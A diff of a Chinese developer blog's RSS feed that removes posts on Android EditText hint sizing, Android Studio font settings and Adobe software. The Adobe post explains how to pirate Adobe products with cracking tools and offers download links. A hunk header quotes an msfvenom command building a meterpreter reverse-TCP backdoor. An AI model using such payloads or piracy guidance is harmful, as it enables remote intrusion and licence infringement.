+      <guid isPermaLink="true">http://localhost:4000/2023/01/%E6%88%91%E7%9A%842022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
+        
+      <category>人生</category>
+        
+        
+    </item>
     
     <item>
       <title>Android 后门程序</title>
@@ -597,200 +1006,6 @@ msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端
       <guid isPermaLink="true">http://localhost:4000/2022/01/%E6%88%91%E7%9A%842021%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
         
       <category>人生</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>Android EditText修改hint文字大小</title>
-      <description>&lt;h3 id=&quot;可是孟婆她断了我的桥&quot;&gt;可是孟婆她断了我的桥。&lt;/h3&gt;
-
-&lt;p&gt;需求：EditText的字体大小18sp，hint文本字体大小为10sp。&lt;/p&gt;
-
-&lt;p&gt;EditText设置hint文本的size。由于没有相关属性，我们需要使用 SpannableString 去实现。&lt;/p&gt;
-
-&lt;p&gt;Google官方是否考虑出一组hint字体相关的属性呢？比如 hintSize,hintColor 这些。&lt;/p&gt;
-
-&lt;p&gt;先看效果图，如下，android:textSize=”18sp”，为凸显效果，只把 hint 文本前半部分修改为了 10sp。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-图1:输入文本，字体大小18sp。
-&lt;img src=&quot;/images/posts/android_hint_size/2.jpeg&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;
-图2:hint文本，设置前半部分字体大小为10sp。
-&lt;br /&gt;
-&lt;img src=&quot;/images/posts/android_hint_size/1.jpeg&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;
-Kotlin 代码如下：&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;androidx.constraintlayout.widget.ConstraintLayout&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:android=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/apk/res/android&quot;&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;xmlns:app=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/apk/res-auto&quot;&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;xmlns:tools=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.android.com/tools&quot;&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;android:layout_width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;android:layout_height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;tools:context=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.MainActivity&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;EditText&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;android:id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@+id/et&quot;&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;android:layout_width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;match_parent&quot;&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;android:layout_height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wrap_content&quot;&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;android:textSize=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;18sp&quot;&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;app:layout_constraintBottom_toBottomOf=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;parent&quot;&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;app:layout_constraintLeft_toLeftOf=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;parent&quot;&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;app:layout_constraintRight_toRightOf=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;parent&quot;&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;app:layout_constraintTop_toTopOf=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;parent&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/androidx.constraintlayout.widget.ConstraintLayout&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.os.Bundle&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.text.SpannableString&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.text.Spanned&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.text.SpannedString&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.text.style.AbsoluteSizeSpan&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;android.widget.EditText&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;androidx.appcompat.app.AppCompatActivity&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MainActivity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AppCompatActivity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;savedInstanceState:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Bundle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onCreate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedInstanceState&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;setContentView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;layout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;activity_main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;editText&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;findViewById&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EditText&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;et&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;customHint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;editText&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;我是hint文本，10sp。秋风知我意，微凉又深情。&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-    &lt;span class=&quot;cm&quot;&gt;/**
-     * 设置EditText中Hint字体大小
-     * @param editText
-     * @param hintString
-     */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;fun&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;customHint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;et:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EditText&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;hintString:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;//设置字体大小&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;textSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AbsoluteSizeSpan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;spannableString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SpannableString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hintString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;spannableString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setSpan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;textSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
-            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;hintString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//注意这里，为了效果显示，只设置了文本的一半&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;Spanned&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SPAN_EXCLUSIVE_EXCLUSIVE&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;et&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SpannedString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;spannableString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2021/11/android-EditText修改hint文字大小/&quot;&gt; Android EditText修改hint文字大小 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Sun, 21 Nov 2021 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2021/11/android-EditText%E4%BF%AE%E6%94%B9hint%E6%96%87%E5%AD%97%E5%A4%A7%E5%B0%8F/</link>
-      <guid isPermaLink="true">http://localhost:4000/2021/11/android-EditText%E4%BF%AE%E6%94%B9hint%E6%96%87%E5%AD%97%E5%A4%A7%E5%B0%8F/</guid>
-        
-      <category>技术</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>Adobe 软件知识点</title>
-      <description>&lt;h3 id=&quot;通过我的试验我起码明白了这点倘若一个人信心满怀地朝他梦想的方向前进努力过上他想象的那种生活那他会在平常的时光里获得意外的成功-梭罗&quot;&gt;通过我的试验，我起码明白了这点：倘若一个人信心满怀地朝他梦想的方向前进，努力过上他想象的那种生活，那他会在平常的时光里获得意外的成功。 –梭罗&lt;/h3&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Adobe公司&lt;/strong&gt;（英语：Adobe Inc.，发音：宽式IPA：/əˈdoʊbiː/，旧称Adobe系统公司），是美国一家跨国电脑软件公司，总部位于加州的圣何塞。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Adobe 特色产品：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Adobe Photoshop：&lt;/strong&gt;图像元老，最受欢迎的强大图像处理软件之一。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Adobe Premiere：&lt;/strong&gt;一种基于非线性编辑设备的视音频编辑软件，可以在各种平台下和硬件配合使用，被广泛的应用于电视台、广告制作、电影剪辑等领域，成为PC和MAC平台上应用最为广泛的视频编辑软件。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Adobe Dreamweaver：&lt;/strong&gt;网页设计软件。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Adobe After Effects：&lt;/strong&gt;特效大师，AE全称After Effects，是由世界著名的图形设计、出版和成像软件设计公司Adobe Systems Inc.开发的专业非线性特效合成软件。是一个灵活的基于层的2D和3D后期合成软件，包含了上百种特效及预置动画效果，与同为Adobe公司出品的Premiere，Photoshop，Illustrator等软件可以无缝结合，创建无与伦比的效果。在影像合成、动画、视觉效果、非线性编辑、设计动画样稿、多媒体和网页动画方面都有其发挥余地。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;等等&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;Adobe 软件 有个很大的问题，就是定价太高。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;于是，破解软件应运而生。Adobe 破解版有两个来源：&lt;/p&gt;
-
-&lt;p&gt;第一个来源是 TNT 团队破解版，此版本安装后需要通过 Adobe Zii 进行破解：Adobe Zii 是一款激活 Adobe 系列软件的最佳 Mac 应用程序，由俄罗斯🇷🇺TNT团队发布。Adobe Zii 大版本发布为年度版本，如 Adobe Zii 2019，Adobe Zii 2020，Adobe Zii 2021，对应的激活 Adobe 2019 CC、Adobe 2020 以及 Adobe 2021 系列软件。大版本之间一般情况下是不通用的，比如使用 Adobe Zii 2021 无法激活 Adobe 2020 系列软件，但有时候也会例外，具体以下载页面更新日志中所标版本为准。小版本跟随 Adobe 软件更新而更新，一般 Adobe 系列软件在官方更新后五天内会发布对应版本的 Zii 激活工具。（简单说，比如要安装ps，首先去Adobe官网安装正版ps，然后下载对应的破解软件Adobe Zii，通过破解软件的操作，即可让安装的ps达到免费使用的效果。）&lt;/p&gt;
-
-&lt;p&gt;第二个来源是国内大神 Vposy 提供的免激活版，此版本精简了一些无用和不太常使用的模块，大大减小了安装包的体积，最重要的是它安装完成后就是激活的！如果图省事建议下载免激活版的。（简单说，比如要安装ps，直接下载Vposy发布的ps破解版本，直接安装即可。）&lt;/p&gt;
-
-&lt;p&gt;如果需要下载链接，邮件联系我即可。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2021/11/Adobe 软件知识点/&quot;&gt; Adobe 软件知识点 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Sun, 21 Nov 2021 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2021/11/Adobe-%E8%BD%AF%E4%BB%B6%E7%9F%A5%E8%AF%86%E7%82%B9/</link>
-      <guid isPermaLink="true">http://localhost:4000/2021/11/Adobe-%E8%BD%AF%E4%BB%B6%E7%9F%A5%E8%AF%86%E7%82%B9/</guid>
-        
-      <category>技术</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>Android studio 搜索无法识别中文</title>
-      <description>&lt;h3 id=&quot;阅读你喜欢的书直到你喜欢阅读做你喜欢的事直到你喜欢去做&quot;&gt;阅读你喜欢的书，直到你喜欢阅读。做你喜欢的事，直到你喜欢去做。&lt;/h3&gt;
-&lt;p&gt;&lt;br /&gt; 
-Android studio 中文无法识别&lt;br /&gt;
-Android studio 无法搜索中文&lt;br /&gt;
-Android studio 全局搜索中文报错&lt;br /&gt;
-Android studio 输入中文变成方框 &lt;br /&gt;
-Android studio 中文编码问题&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/posts/android_zhongwencuowu/1.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;
-Google了很多这个问题，试了N多种网上的解决方案，没成，最后去设置里找文本相关的属性，一个个挨着试的，最后解决！&lt;/p&gt;
-
-&lt;p&gt;解决方案:  Android Studio -&amp;gt; Preference -&amp;gt; Appearance &amp;amp; Behavior -&amp;gt; Appearance -&amp;gt; 勾选 Use custom font:  -&amp;gt; 点击ok 就可以了&lt;br /&gt;
-&lt;br /&gt;
-如下图所示：&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/android_zhongwencuowu/2.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/posts/android_zhongwencuowu/3.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;此时，输入中文就可以看到了。&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/posts/android_zhongwencuowu/4.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2021/08/android-studio-搜索无法识别中文/&quot;&gt; Android studio 搜索无法识别中文 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Mon, 23 Aug 2021 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2021/08/android-studio-%E6%90%9C%E7%B4%A2%E6%97%A0%E6%B3%95%E8%AF%86%E5%88%AB%E4%B8%AD%E6%96%87/</link>
-      <guid isPermaLink="true">http://localhost:4000/2021/08/android-studio-%E6%90%9C%E7%B4%A2%E6%97%A0%E6%B3%95%E8%AF%86%E5%88%AB%E4%B8%AD%E6%96%87/</guid>
-        
-      <category>技术</category>
         
         
     </item>
